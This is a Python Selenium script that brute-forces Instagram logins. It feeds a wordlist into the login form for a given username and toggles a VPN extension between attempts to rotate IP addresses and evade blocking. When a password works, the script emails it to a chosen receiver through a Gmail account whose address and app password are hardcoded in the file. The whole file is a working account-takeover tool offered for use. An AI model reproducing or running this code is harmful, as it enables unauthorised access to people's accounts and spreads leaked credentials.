# libraries
import os
import ssl
import time
import smtplib
import argparse
from selenium import webdriver
from email.message import EmailMessage
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support import expected_conditions as EC

# functions
def getting_input_from_user():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", dest="username", help="[-] The username")
    parser.add_argument("-p", "--passwordlist", dest="passwordlist", help="[-] The password list")
    parser.add_argument("-r", "--receiver", dest="receiver", help="[-] The person to whom the password will be sent")
    options = parser.parse_args()
    if not options.username:
        parser.error("[!] Please enter the username")
    elif not options.passwordlist:
        parser.error("[!] Specify the path to the password list")
    else:
        return options

def deleting_password_input(browser, password):
    browser.find_element(By.XPATH, password).send_keys(Keys.CONTROL + "a")
    browser.find_element(By.XPATH, password).send_keys(Keys.DELETE)

def endless_cycle():
    while True:
        pass

def checking_url(url, passwords):
    browser.implicitly_wait(60)
    if url != browser.current_url:
        global options
        print(f"[+] {passwords}: correct")
        print("[-] Brute force is over")
        if options.receiver:
            send_email(options.receiver, passwords)
        endless_cycle()

def matching_passwords(browser, password, passwords, button):
    browser.find_element(By.XPATH, password).send_keys(passwords)
    if len(passwords) >= 6:
        time.sleep(1)
        browser.find_element(By.XPATH, button).click()

def printing_logo():
    print(""" 
       ____        __                             ___           __        ____                
      /  _/__  ___/ /____ ____ ________ ___ _    / _ )______ __/ /____   / __/__  ___________ 
     _/ // _ \(_-< __/ _ `/ _ `/ __/ _ `/  ' \  / _  / __/ // / __/ -_) / _// _ \/ __/ __/ -_)
    /___/_//_/___|__/\_,_/\_, /_/  \_,_/_/_/_/ /____/_/  \_,_/\__/\__/ /_/  \___/_/  \__/\__/ 
                         /___/                                                                
     """)

def send_email(receiver, passwd):
    email_sender = "lordd2505@gmail.com"
    python_password = "bvmgmmbngjoesccr"
    subject = "The result of brute force"
    body = f"""
    The password is {passwd}
    """
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = receiver
    em['Subject'] = subject
    em.set_content(body)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, python_password)
        smtp.sendmail(email_sender, receiver, em.as_string())

def changing_ip(browser, active_deactive_btn_html):
    browser.switch_to.window(browser.window_handles[0])
    browser.find_element(By.XPATH, active_deactive_btn_html).click()
    WebDriverWait(browser, 3600).until(EC.element_to_be_clickable((By.XPATH, active_deactive_btn_html)))
    browser.find_element(By.XPATH, active_deactive_btn_html).click()
    WebDriverWait(browser, 3600).until(EC.element_to_be_clickable((By.XPATH, active_deactive_btn_html)))
    browser.switch_to.window(browser.window_handles[1])

# basic settings
url = "https://www.instagram.com/"
name = '/html/body/div[2]/div/div/div/div[1]/div/div/div/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[1]/div/label/input'
password = '/html/body/div[2]/div/div/div/div[1]/div/div/div/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[2]/div/label/input'
button = '/html/body/div[2]/div/div/div/div[1]/div/div/div/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button'
password_list = []

url_of_vpn = "chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/popup/index.html#/main"
active_deactive_btn_html = "/html/body/div/div/div[3]/div[4]/div/div"
agree_btn = "/html/body/div/div/div[2]/div/div/div[2]/button[2]"

options = getting_input_from_user()

with open(options.passwordlist, "r") as file:
    content = file.read()
    password_in_file = ""
    for char in content:
        if char == "\n":
            password_list.append(password_in_file)
            password_in_file = ""
        else:
            password_in_file += char
    password_list.append(password_in_file)

# main code
try:
    os.system("color a")
    settings = webdriver.ChromeOptions()
    settings.add_experimental_option('excludeSwitches', ['enable-logging'])
    settings.add_argument('--load-extension={}'.format(r'C:\Users\mbagi\AppData\Local\Google\Chrome\User Data\Default\Extensions\eppiocemhmnlbhjplcgkofciiegomcon\2.5.11_0'))
    browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=settings)
    browser.get(url_of_vpn)
    browser.execute_script(f"window.open('{url}');")
    time.sleep(10)
    browser.switch_to.window(browser.window_handles[0])
    browser.find_element(By.XPATH, agree_btn).click()
    time.sleep(2)
    WebDriverWait(browser, 3600).until(EC.element_to_be_clickable((By.XPATH, active_deactive_btn_html)))
    browser.find_element(By.XPATH, active_deactive_btn_html).click()
    WebDriverWait(browser, 3600).until(EC.element_to_be_clickable((By.XPATH, active_deactive_btn_html)))
    browser.switch_to.window(browser.window_handles[1])
    os.system("cls")
    printing_logo()
    print("[+] Brute will start within 1 minute")
    time.sleep(60)
    browser.find_element(By.XPATH, name).send_keys(options.username)
    for passwords in password_list:
        matching_passwords(browser, password, passwords, button)
        time.sleep(10)
        checking_url(url, passwords)
        changing_ip(browser, active_deactive_btn_html)
        print(f"[-] {passwords}: wrong")
        deleting_password_input(browser, password)
    print("[-] Brute force is over")
    browser.close()
except KeyboardInterrupt:
    print("[-] Exiting the program")
    browser.close()
